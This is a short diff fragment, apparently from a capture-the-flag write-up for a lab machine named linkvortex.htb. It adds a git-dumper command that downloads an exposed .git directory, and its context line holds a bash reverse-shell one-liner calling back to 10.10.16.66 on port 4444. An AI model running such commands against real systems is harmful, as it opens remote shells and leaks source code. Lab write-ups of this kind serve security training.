@@ -21,7 +21,7 @@ echo "bash -i >& /dev/tcp/10.10.16.66/4444 0>&1" > /tmp/shell.sh
 ```
 
 ```
-
+git-dumper http://dev.linkvortex.htb/.git gitdump
 ```
 
 ```
